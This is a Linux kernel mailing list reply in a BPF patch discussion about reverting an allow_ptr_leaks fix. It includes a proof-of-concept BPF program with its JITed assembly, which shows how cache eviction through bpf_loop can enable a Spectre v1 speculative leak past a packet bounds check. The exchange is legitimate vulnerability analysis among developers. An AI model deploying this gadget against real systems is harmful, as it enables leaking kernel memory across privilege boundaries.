Return-Path: <linux-kselftest-owner@vger.kernel.org>
X-Original-To: lists+linux-kselftest@lfdr.de
Delivered-To: lists+linux-kselftest@lfdr.de
Received: from out1.vger.email (out1.vger.email [IPv6:2620:137:e000::1:20])
	by mail.lfdr.de (Postfix) with ESMTP id B9E4F7A486C
	for <lists+linux-kselftest@lfdr.de>; Mon, 18 Sep 2023 13:30:39 +0200 (CEST)
Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
        id S241739AbjIRLaL (ORCPT <rfc822;lists+linux-kselftest@lfdr.de>);
        Mon, 18 Sep 2023 07:30:11 -0400
Received: from lindbergh.monkeyblade.net ([23.128.96.19]:49002 "EHLO
        lindbergh.monkeyblade.net" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S241243AbjIRL3k (ORCPT
        <rfc822;linux-kselftest@vger.kernel.org>);
        Mon, 18 Sep 2023 07:29:40 -0400
Received: from smtp-fw-52005.amazon.com (smtp-fw-52005.amazon.com [52.119.213.156])
        by lindbergh.monkeyblade.net (Postfix) with ESMTPS id 6896CD2;
        Mon, 18 Sep 2023 04:26:36 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
  d=amazon.de; i=@amazon.de; q=dns/txt; s=amazon201209;
  t=1695036406; x=1726572406;
  h=from:to:cc:subject:date:message-id:in-reply-to:
   references:mime-version:content-transfer-encoding;
  bh=+R3gVeOO0pGf426iuoC48P59vEh9CxefiN0g0o/engg=;
  b=a3kgMQPLwz9l/QYzP+u13kwHg7v2Lu31A4HWNBZiWPFLay3NaxqwVg53
   eUnAI+zVBDkyboHsRmuYuJBoMRpTUjJrximz0k4LsjM2eQ/N2vwq4fGcT
   FhoCokm83KswJD9vzevjtWFCx46k3npjsj56iJkS+szxTVgVlmYSzIST1
   U=;
X-IronPort-AV: E=Sophos;i="6.02,156,1688428800"; 
   d="scan'208";a="605034221"
Received: from iad12-co-svc-p1-lb1-vlan3.amazon.com (HELO email-inbound-relay-iad-1a-m6i4x-366646a6.us-east-1.amazon.com) ([10.43.8.6])
  by smtp-border-fw-52005.iad7.amazon.com with ESMTP/TLS/ECDHE-RSA-AES256-GCM-SHA384; 18 Sep 2023 11:26:32 +0000
Received: from EX19D017EUA004.ant.amazon.com (iad12-ws-svc-p26-lb9-vlan2.iad.amazon.com [10.40.163.34])
        by email-inbound-relay-iad-1a-m6i4x-366646a6.us-east-1.amazon.com (Postfix) with ESMTPS id 67D86A3FCA;
        Mon, 18 Sep 2023 11:26:27 +0000 (UTC)
Received: from dev-dsk-gerhorst-1c-a6f23d20.eu-west-1.amazon.com
 (10.15.21.113) by EX19D017EUA004.ant.amazon.com (10.252.50.239) with
 Microsoft SMTP Server (version=TLS1_2,
 cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.2.1118.37; Mon, 18 Sep
 2023 11:26:19 +0000
From:   Luis Gerhorst <gerhorst@amazon.de>
To:     <alexei.starovoitov@gmail.com>
CC:     <andrii@kernel.org>, <ast@kernel.org>, <bpf@vger.kernel.org>,
        <daniel@iogearbox.net>, <gerhorst@amazon.de>, <gerhorst@cs.fau.de>,
        <hagarhem@amazon.de>, <haoluo@google.com>, <iii@linux.ibm.com>,
        <john.fastabend@gmail.com>, <jolsa@kernel.org>,
        <kpsingh@kernel.org>, <laoar.shao@gmail.com>,
        <linux-kernel@vger.kernel.org>, <linux-kselftest@vger.kernel.org>,
        <martin.lau@linux.dev>, <mykolal@fb.com>, <puranjay12@gmail.com>,
        <sdf@google.com>, <shuah@kernel.org>, <song@kernel.org>,
        <yonghong.song@linux.dev>
Subject: Re: [PATCH 2/3] Revert "bpf: Fix issue in verifying allow_ptr_leaks"
Date:   Mon, 18 Sep 2023 11:25:50 +0000
Message-ID: <20230918112549.105846-1-gerhorst@amazon.de>
X-Mailer: git-send-email 2.40.1
In-Reply-To: <CAADnVQJ4Fg-VQ-tVCEqsKLuozT7y_o8pZ1oM3eBW7u-Z0jOk4A@mail.gmail.com>
References: <CAADnVQJ4Fg-VQ-tVCEqsKLuozT7y_o8pZ1oM3eBW7u-Z0jOk4A@mail.gmail.com>
MIME-Version: 1.0
X-Originating-IP: [10.15.21.113]
X-ClientProxiedBy: EX19D035UWA002.ant.amazon.com (10.13.139.60) To
 EX19D017EUA004.ant.amazon.com (10.252.50.239)
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
X-Spam-Status: No, score=0.4 required=5.0 tests=BAYES_00,DKIMWL_WL_HIGH,
        DKIM_SIGNED,DKIM_VALID,DKIM_VALID_AU,DKIM_VALID_EF,
        RCVD_IN_DNSWL_BLOCKED,RCVD_IN_MSPIKE_H5,RCVD_IN_MSPIKE_WL,
        SORTED_RECIPS,SPF_HELO_NONE,T_SPF_PERMERROR autolearn=no
        autolearn_force=no version=3.4.6
X-Spam-Checker-Version: SpamAssassin 3.4.6 (2021-04-09) on
        lindbergh.monkeyblade.net
Precedence: bulk
List-ID: <linux-kselftest.vger.kernel.org>
X-Mailing-List: linux-kselftest@vger.kernel.org

On Thu, 14 Sep 2023 12:47:16 -0700, Alexei Starovoitov wrote:
> You mean since skb_shared_info is placed after skb->end
> and in zero copy case destructor_arg may be initialized with the same
> kernel pointer for multiple skb-s ?
> The attacker cannot construct the address from data_end.
> The verifier explicitly prohibits any ALU with PTR_TO_PACKET_END.
> But the attacker can do skb->data + X.
> The idea is that they can train the branch to mispredict with
> a large packet and then send a small one so that shared_info
> after skb->end has the same uarg pointer in all packets?
> So every skb->data+X is a different location, but all of them
> point to data that has uarg==destructor_arg ?
>
> That would be feasible in theory, but in order to speculate the loads
> the branch mispredict has to be reliable.
> The spec v1 attack requires one of two loads feeding
> into compare operation has to be slow.
> In this case both data and data_end loads are going to be fast.
> The attacker cannot evict skb->data or skb->data_end from cache.

It is true that this is not easily possible using the method most exploits use,
at least to my knowledge (i.e., accessing the same address from another core).
However, it is still possible to evict the cacheline with skb->data/data_end
from the cache in between the loads by iterating over a large map using
bpf_loop(). Then the load of skb->data_end would be slow while skb->data is
readily available in a callee-saved register.

For a CPU with 64KiB of per-core L1 cache all 64-byte cachelines can be evicted
by iterating over a 64KiB array using 64-byte increments, that's only 1k
iterations. Meanwhile, skb->data can be safe in r15 as this is not used by
bpf_loop() and bpf_map_lookup_elem(). Even evicting the L2 cache might be
possible as bpf_loop() currently has a iteration limit of 8 million. To extend
that, userspace could work on evicting the L3 cache from other cores and make
the speculation window even larger. This would of course slow the whole reading
process down, but in return you can also leak more data by indexing into the
leak-array using a full byte.

For reference, here's the full program and assembly it is jited to:

static long callback_fn(__u32 index, void *ctx) {
	__u32 key = index * 8;
	__u64 *value = bpf_map_lookup_elem(&evictmap, &key);
	if (value) {
		*value = 2 * *value;
		return 0;
	}
	return 1;
}

SEC("tcx/ingress")
__naked void pkt_ptr(void)
{
	// +76: data
	// +80: data_end
	asm volatile (" \
r6 = 0; \
r7 = r1; \
prepare_data_%=: \
r8 = *(u32 *)(r1 + 76); \
r9 = r8; \
r9 += 34; \
evict_loop_%=: \
w1 = 1024;		\
r2 = %[callback_fn] ll; \
r3 = 0; \
*(u64 *)(r10 - 8) = r3; \
r3 = r10; \
r3 += -8; \
r4 = 0; \
call %[bpf_loop]; \
gadget_%=: \
r2 = *(u32 *)(r7 + 80);	  \
if r2 <= r9 goto exit_%=; \
r5 = *(u8 *)(r7 + 14); \
*(u64*)(r10 - 8) = r5; \
r2 = r10; \
r2 += -8; \
r1 = %[leakmap] ll; \
call %[bpf_map_lookup_elem]; \
if r0 == 0 goto exit_%=; \
r6 = *(u64 *)(r0 + 0); \
exit_%=: r0 = r6; \
exit; \
"	:
    : __imm_addr(leakmap),
	  __imm_addr(callback_fn),
	  __imm(bpf_loop),
	  __imm(bpf_map_lookup_elem)
	: __clobber_all);
}

bpf_prog_64fe264baec539aa_pkt_ptr:
; asm volatile (" \
   0:   endbr64
   4:   nopl   0x0(%rax,%rax,1)
   9:   xchg   %ax,%ax
   b:   push   %rbp
   c:   mov    %rsp,%rbp
   f:   endbr64
  13:   sub    $0x20,%rsp
  1a:   push   %rbx
  1b:   push   %r13
  1d:   push   %r14
  1f:   push   %r15
  21:   xor    %ebx,%ebx
  23:   mov    %rdi,%r13
  26:   mov    0xc8(%rdi),%r14
  2d:   mov    %r14,%r15
  30:   add    $0x22,%r15 // data prepared
  34:   mov    $0x2000,%edi
  39:   movabs $0xffffffffc01d09b0,%rsi
  43:   xor    %edx,%edx
  45:   mov    %rdx,-0x8(%rbp)
  49:   lfence
  4c:   mov    %rbp,%rdx
  4f:   add    $0xfffffffffffffff8,%rdx
  53:   xor    %ecx,%ecx
  55:   cmp    $0x800000,%rdi
  5c:   jbe    0x0000000000000065
  5e:   mov    $0xfffffff9,%eax
  63:   jmp    0x00000000000000a2
  65:   mov    %rbx,-0x20(%rbp)
  69:   mov    %r13,-0x18(%rbp)
  6d:   mov    %r14,-0x10(%rbp)
  71:   mov    %rdi,%rbx
  74:   xor    %r13d,%r13d
  77:   mov    %rdx,%r14
  7a:   cmp    %rbx,%r13
  7d:   jae    0x0000000000000093
  7f:   mov    %r13,%rdi
  82:   mov    %r14,%rsi
  85:   callq  0x0000000000000148
  8a:   add    $0x1,%r13
  8e:   test   %rax,%rax
  91:   je     0x000000000000007a
  93:   mov    %r13,%rax
  96:   mov    -0x20(%rbp),%rbx
  9a:   mov    -0x18(%rbp),%r13
  9e:   mov    -0x10(%rbp),%r14
  a2:   mov    0x50(%r13),%rsi // load data_end
  a6:   cmp    %r15,%rsi // use of data_end and data
  a9:   jbe    0x00000000000000f7 // to mispredict
  ab:   movzwq 0x7c(%r13),%r8 // use of data
  b0:   shr    $0x10,%r8d
  b4:   and    $0xff,%r8d
  bb:   mov    %r8,-0x8(%rbp)
  bf:   mov    %rbp,%rsi
  c2:   add    $0xfffffffffffffff8,%rsi
  c6:   movabs $0xffffb85680acd000,%rdi
  d0:   add    $0x210,%rdi
  d7:   mov    0x0(%rsi),%eax
  da:   cmp    $0x20000,%rax
  e1:   jae    0x00000000000000ec
  e3:   shl    $0x3,%rax
  e7:   add    %rdi,%rax
  ea:   jmp    0x00000000000000ee
  ec:   xor    %eax,%eax
  ee:   test   %rax,%rax
  f1:   je     0x00000000000000f7
  f3:   mov    0x0(%rax),%rbx
  f7:   mov    %rbx,%rax
  fa:   pop    %r15
  fc:   pop    %r14
  fe:   pop    %r13
 100:   pop    %rbx
 101:   leaveq
 102:   retq

long callback_fn(__u32 index, void * ctx):
bpf_prog_8e1ec5bf965fdd4a_callback_fn:
; __u32 key = index * 8;
   0:   endbr64
   4:   nopl   0x0(%rax,%rax,1)
   9:   xchg   %ax,%ax
   b:   push   %rbp
   c:   mov    %rsp,%rbp
   f:   endbr64
  13:   sub    $0x8,%rsp
  1a:   shl    $0x3,%edi
; __u32 key = index * 8;
  1d:   mov    %edi,-0x4(%rbp)
  20:   lfence
  23:   mov    %rbp,%rsi
;
  26:   add    $0xfffffffffffffffc,%rsi
; __u64 *value = bpf_map_lookup_elem(&evictmap, &key);
  2a:   movabs $0xffffb85680a01000,%rdi
  34:   add    $0x210,%rdi
  3b:   mov    0x0(%rsi),%eax
  3e:   cmp    $0x1000,%rax
  45:   jae    0x0000000000000050
  47:   shl    $0x3,%rax
  4b:   add    %rdi,%rax
  4e:   jmp    0x0000000000000052
  50:   xor    %eax,%eax
  52:   mov    $0x1,%edi
; if (value) {
  57:   test   %rax,%rax
  5a:   je     0x0000000000000069
; *value = 2 * *value;
  5c:   mov    0x0(%rax),%rdi
; *value = 2 * *value;
  60:   shl    %rdi
; *value = 2 * *value;
  63:   mov    %rdi,0x0(%rax)
  67:   xor    %edi,%edi
; }
  69:   mov    %rdi,%rax
  6c:   leaveq
  6d:   retq

> Remember that we rearranged 'max_entries' field in struct bpf_map
> specifically to be in the different cache line vs fields
> controlled by user space. It was the necessary part of spec v1 attack.

-- 
Luis



Amazon Development Center Germany GmbH
Krausenstr. 38
10117 Berlin
Geschaeftsfuehrung: Christian Schlaeger, Jonathan Weiss
Eingetragen am Amtsgericht Charlottenburg unter HRB 149173 B
Sitz: Berlin
Ust-ID: DE 289 237 879



